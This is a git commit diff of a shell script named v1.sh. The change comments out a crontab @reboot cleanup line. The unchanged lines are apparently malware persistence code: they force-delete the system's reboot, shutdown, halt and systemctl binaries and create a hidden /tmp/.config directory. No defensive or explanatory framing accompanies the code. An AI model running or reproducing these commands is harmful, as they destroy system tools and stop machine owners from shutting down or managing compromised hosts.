1b053ab91d903a965d76a79791a45dcc5b908b98
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-03-14 07:11:35 +0800

    Update v1.sh

--- v1.sh
+++ v1.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-sudo sed -i '/^@reboot/d' /etc/crontab
+##sudo sed -i '/^@reboot/d' /etc/crontab
 sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 
 mkdir -p /tmp/.config
